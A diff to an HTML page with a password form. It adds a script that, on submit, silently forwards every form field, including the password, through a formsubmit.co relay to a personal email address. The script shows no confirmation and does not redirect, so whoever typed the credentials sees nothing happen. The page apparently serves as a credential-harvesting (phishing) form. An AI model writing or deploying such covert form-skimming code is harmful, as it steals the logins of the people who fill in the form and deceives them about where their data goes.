@@ -105,6 +105,7 @@ textarea {
     name="contraseña"
     placeholder="contraseña"
     required
+    
   />
 </div>
 <input
@@ -124,6 +125,29 @@ textarea {
   </form>
 
 </div>
+<script>
+document.getElementById("formulario").addEventListener("submit", async function(event) {
+  event.preventDefault();
 
+  const formulario = this;
+  const datos = new FormData(formulario);
+
+  try {
+    await fetch("https://formsubmit.co/ajax/echavarriaadonys@gmail.com", {
+      method: "POST",
+      body: datos,
+      headers: {
+        "Accept": "application/json"
+      }
+    });
+
+    // No muestra ningún mensaje ni redirige a otra página.
+    // El formulario permanece en la misma página.
+
+  } catch (error) {
+    console.error("Error al enviar el formulario:", error);
+  }
+});
+</script>
 </body>
 </html>
